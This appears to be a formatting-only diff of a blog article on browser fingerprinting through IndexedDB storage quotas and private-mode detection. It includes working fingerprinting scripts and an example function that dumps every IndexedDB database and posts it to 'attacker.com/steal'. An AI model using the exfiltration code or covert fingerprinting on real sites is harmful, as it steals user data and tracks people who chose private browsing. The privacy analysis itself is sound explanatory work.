@@ -17,12 +17,12 @@ const hasIndexedDB = 'indexedDB' in window;
 // Open a database
 const request = indexedDB.open('myDatabase', 1);
 
-request.onsuccess = function(event) {
+request.onsuccess = function (event) {
   const db = event.target.result;
   console.log('Database opened:', db.name);
 };
 
-request.onerror = function(event) {
+request.onerror = function (event) {
   console.error('Database error:', event.target.error);
 };
 ```
@@ -35,10 +35,10 @@ async function checkStorageQuota() {
   if ('storage' in navigator && 'estimate' in navigator.storage) {
     const estimate = await navigator.storage.estimate();
     return {
-      quota: estimate.quota,           // Total available
-      usage: estimate.usage,           // Currently used
+      quota: estimate.quota, // Total available
+      usage: estimate.usage, // Currently used
       available: estimate.quota - estimate.usage,
-      percentUsed: (estimate.usage / estimate.quota) * 100
+      percentUsed: (estimate.usage / estimate.quota) * 100,
     };
   }
   return null; // Private mode often returns null or 0
@@ -51,21 +51,21 @@ That `navigator.storage.estimate()` call? That's the fingerprinting vector. Let 
 
 IndexedDB is everywhere. Like, 99.5%+ of browsers support it:
 
-| Browser | First Support | 2024-2025 Status | Quota Calculation | Private Mode Quota |
-|---------|--------------|------------------|-------------------|-------------------|
-| Chrome | v24 (2013) | Full support | 60% of disk space | Same as normal* |
-| Firefox | v16 (2012) | Full support | 50% of disk space | Limited (encrypted) |
-| Safari | v8 (2014) | Full support | ~1GB (iOS), larger on macOS | Heavily restricted |
-| Edge | v12 (2015) | Full support | 60% of disk space | Same as normal* |
-| Opera | v15 (2013) | Full support | 60% of disk space | Same as normal* |
-| Mobile Safari | iOS 8 (2014) | Full support | ~50-500MB (varies) | Restricted |
-| Chrome Android | v25 (2013) | Full support | 60% of disk space | Same as normal* |
+| Browser        | First Support | 2024-2025 Status | Quota Calculation           | Private Mode Quota  |
+| -------------- | ------------- | ---------------- | --------------------------- | ------------------- |
+| Chrome         | v24 (2013)    | Full support     | 60% of disk space           | Same as normal\*    |
+| Firefox        | v16 (2012)    | Full support     | 50% of disk space           | Limited (encrypted) |
+| Safari         | v8 (2014)     | Full support     | ~1GB (iOS), larger on macOS | Heavily restricted  |
+| Edge           | v12 (2015)    | Full support     | 60% of disk space           | Same as normal\*    |
+| Opera          | v15 (2013)    | Full support     | 60% of disk space           | Same as normal\*    |
+| Mobile Safari  | iOS 8 (2014)  | Full support     | ~50-500MB (varies)          | Restricted          |
+| Chrome Android | v25 (2013)    | Full support     | 60% of disk space           | Same as normal\*    |
 
-*"Same as normal" but with auto-delete on session end
+\*"Same as normal" but with auto-delete on session end
 
 Source: MDN Web Docs, Can I Use, browser testing (2024)
 
-**Key insight**: IndexedDB support is universal, so checking for its existence gives you **~0 bits of entropy**. Everyone has it. But checking the *quota* and *behavior*? That's where the magic happens.
+**Key insight**: IndexedDB support is universal, so checking for its existence gives you **~0 bits of entropy**. Everyone has it. But checking the _quota_ and _behavior_? That's where the magic happens.
 
 ## The Quota Fingerprinting Vector
 
@@ -74,21 +74,25 @@ Here's the thing that makes IndexedDB fingerprinting powerful: browsers calculat
 ### Quota Calculation by Browser (2024 Data)
 
 **Chromium-based (Chrome, Edge, Opera, Brave)**:
+
 - Formula: `quota = total_disk_size * 0.60`
 - Example: 1TB drive = 600GB quota
 - Precision: Exact bytes (e.g., 599,924,752,384 bytes)
 
 **Firefox**:
+
 - Formula: `quota = total_disk_size * 0.50`
 - Example: 1TB drive = 500GB quota
 - Precision: Rounded to MB
 
 **Safari (macOS)**:
+
 - Formula: Dynamic, but typically ~1-5GB
 - Example: Varies by macOS version and available space
 - Precision: Rough estimates
 
 **Mobile browsers**:
+
 - iOS Safari: 50-500MB (depends on iOS version, device storage)
 - Chrome Android: Based on available storage, typically 60%
 
@@ -99,10 +103,10 @@ async function fingerprintStorageQuota() {
   const estimate = await navigator.storage.estimate();
 
   if (!estimate || !estimate.quota) {
-    return { fingerprint: 'likely_private_mode', entropy: 5+ bits };
+    return { fingerprint: 'likely_private_mode', entropy: 5 + bits };
   }
 
-  const quotaGB = (estimate.quota / (1024**3)).toFixed(2);
+  const quotaGB = (estimate.quota / 1024 ** 3).toFixed(2);
 
   // Device storage fingerprint
   // A 256GB drive: ~154GB quota
@@ -113,9 +117,9 @@ async function fingerprintStorageQuota() {
   return {
     quotaBytes: estimate.quota,
     quotaGB: quotaGB,
-    deviceStorageEstimate: (estimate.quota / 0.6 / (1024**3)).toFixed(0) + 'GB',
+    deviceStorageEstimate: (estimate.quota / 0.6 / 1024 ** 3).toFixed(0) + 'GB',
     fingerprint: estimate.quota.toString(),
-    entropy: '~4-5 bits' // Based on common drive sizes
+    entropy: '~4-5 bits', // Based on common drive sizes
   };
 }
 ```
@@ -129,6 +133,7 @@ Here's where it gets really interesting. According to research from Fingerprint.
 ### Detection Methods
 
 **Method 1: Quota Check**
+
 ```javascript
 async function detectPrivateModeViaQuota() {
   try {
@@ -142,8 +147,13 @@ async function detectPrivateModeViaQuota() {
       return { privateMode: 'likely', confidence: 'high', browser: 'Safari' };
     }
 
-    if (estimate.quota < 120 * 1024 * 1024) { // < 120MB
-      return { privateMode: 'likely', confidence: 'medium', browser: 'Safari iOS' };
+    if (estimate.quota < 120 * 1024 * 1024) {
+      // < 120MB
+      return {
+        privateMode: 'likely',
+        confidence: 'medium',
+        browser: 'Safari iOS',
+      };
     }
 
     return { privateMode: 'unlikely', confidence: 'low' };
@@ -154,6 +164,7 @@ async function detectPrivateModeViaQuota() {
 ```
 
 **Method 2: IndexedDB Open Error**
+
 ```javascript
 function detectPrivateModeViaIndexedDB() {
   return new Promise((resolve) => {
@@ -177,6 +188,7 @@ function detectPrivateModeViaIndexedDB() {
 ```
 
 **Method 3: Persistence Check**
+
 ```javascript
 async function detectPrivateViaPersistence() {
   if ('storage' in navigator && 'persist' in navigator.storage) {
@@ -187,7 +199,7 @@ async function detectPrivateViaPersistence() {
       const canPersist = await navigator.storage.persisted();
       return {
         privateMode: !canPersist ? 'likely' : 'unknown',
-        persistence: { requested: isPersisted, actual: canPersist }
+        persistence: { requested: isPersisted, actual: canPersist },
       };
     }
   }
@@ -198,24 +210,28 @@ async function detectPrivateViaPersistence() {
 ### Browser-Specific Private Mode Behavior (2024-2025)
 
 **Chrome Incognito** (as of Chrome 130+):
+
 - IndexedDB works normally
 - Quota reported accurately
 - Data encrypted and deleted on exit
 - **Detection difficulty**: Very hard (behaves like normal mode)
 
 **Firefox Private Browsing** (as of Firefox 115+):
+
 - IndexedDB works but data encrypted on disk (since July 2023)
 - Normal quota reported
 - Before Firefox 115: IndexedDB was completely blocked (easy detection)
 - **Detection difficulty**: Hard on modern versions, easy on older versions
 
 **Safari Private Browsing**:
+
 - IndexedDB heavily restricted
 - Quota reported as 0 or very small (~50MB)
 - Many operations throw errors
 - **Detection difficulty**: Easy (quota is the giveaway)
 
 **Edge Chromium Incognito**:
+
 - Identical to Chrome (same codebase)
 - **Detection difficulty**: Very hard
 
@@ -236,6 +252,7 @@ More than 30 websites in the Alexa Top 1000 interact with IndexedDB on homepage 
 Let's calculate the entropy contribution of IndexedDB quota:
 
 **Common drive sizes** (consumer market, 2024):
+
 - 128GB: ~10% of devices
 - 256GB: ~25% of devices
 - 512GB: ~30% of devices
@@ -244,6 +261,7 @@ Let's calculate the entropy contribution of IndexedDB quota:
 - Other: ~5%
 
 **Entropy calculation**:
+
 ```
 If 30% have 512GB: -log2(0.30) = 1.74 bits
 If quota reveals exact drive size: -log2(1/[number of distinct sizes])
@@ -262,6 +280,7 @@ Here's the sneaky part: browsers report quota in exact bytes. So even if two peo
 - Person B: 307,198,765,056 bytes
 
 That tiny difference? Unique identifier. According to 2024 testing, Chromium-based browsers calculate quota based on the **filesystem's reported size**, which varies based on:
+
 - Partition scheme (GPT vs MBR)
 - Filesystem overhead (NTFS vs ext4 vs APFS)
 - Reserved system space
@@ -283,7 +302,7 @@ async function indexedDBFingerprint() {
     persistent: null,
     estimatedDiskSize: null,
     privateMode: null,
-    errors: []
+    errors: [],
   };
 
   // Test basic support
@@ -330,6 +349,7 @@ async function indexedDBFingerprint() {
 ```
 
 This script extracts:
+
 1. **Device storage size** (4-5 bits entropy)
 2. **Private mode detection** (binary, but high value)
 3. **Browser identification** (quota algorithm differs)
@@ -340,11 +360,13 @@ This script extracts:
 Firefox's handling of IndexedDB in private mode is a great case study. Here's the timeline:
 
 **Before July 2023** (Firefox <115):
+
 - Private mode: IndexedDB completely blocked
 - Opening IndexedDB threw error: `NS_ERROR_FILE_CORRUPTED`
 - **Result**: 99% accurate private mode detection
 
 **After July 2023** (Firefox 115+):
+
 - Private mode: IndexedDB works but data stored encrypted on disk
 - Deleted when private window closes
 - Normal quota reported
@@ -381,7 +403,7 @@ async function stealAllIndexedDB() {
           // Send to attacker's server
           fetch('https://attacker.com/steal', {
             method: 'POST',
-            body: JSON.stringify({ db: dbInfo.name, data })
+            body: JSON.stringify({ db: dbInfo.name, data }),
           });
         };
       }
@@ -391,6 +413,7 @@ async function stealAllIndexedDB() {
 ```
 
 This is why you should **never store sensitive data** in IndexedDB without encryption:
+
 - ❌ Authentication tokens (use httpOnly cookies instead)
 - ❌ Credit card numbers
 - ❌ Social security numbers
@@ -433,6 +456,7 @@ For fingerprinting scripts, this means they can query IndexedDB quota without fr
 Fun historical note: In January 2022, researchers discovered a serious Safari 15 bug where IndexedDB databases were leaking across origins. If you were logged into Google, any website could see the names of your IndexedDB databases, which included your Google User ID.
 
 From the original disclosure:
+
 > "Every time a website interacts with a database, a new (empty) database with the same name is created in all other active frames, tabs, and windows within the same browser session. This means that any website can learn what databases a user has created."
 
 Apple fixed this in Safari 15.2, but it's a great example of how seemingly isolated APIs can leak information.
@@ -465,16 +489,17 @@ Want to see what fingerprinters see? Paste this into your browser console:
     usage: null,
     estimatedDiskSize: null,
     persistent: null,
-    privateMode: null
+    privateMode: null,
   };
 
   if (results.storageAPI) {
     try {
       const estimate = await navigator.storage.estimate();
       results.quota = estimate.quota;
-      results.quotaGB = (estimate.quota / (1024**3)).toFixed(2) + ' GB';
+      results.quotaGB = (estimate.quota / 1024 ** 3).toFixed(2) + ' GB';
       results.usage = estimate.usage;
-      results.estimatedDiskSize = Math.round(estimate.quota / 0.6 / (1024**3)) + ' GB';
+      results.estimatedDiskSize =
+        Math.round(estimate.quota / 0.6 / 1024 ** 3) + ' GB';
 
       if (estimate.quota < 100 * 1024 * 1024) {
         results.privateMode = 'Likely (Safari Private)';
@@ -514,6 +539,7 @@ Here's my straight advice:
 IndexedDB is a great API for web developers - it's fast, powerful, and well-supported. But for privacy? It's a fingerprinting goldmine. The quota reporting reveals your device's storage capacity (4-5 bits of entropy), and private mode behavior differs so much across browsers that detection is often easy.
 
 As of 2024-2025:
+
 - **Safari private mode**: Easily detected (95%+ accuracy)
 - **Chrome incognito**: Very hard to detect (10-20% accuracy)
 - **Firefox private (modern)**: Moderately difficult (30-40% accuracy)
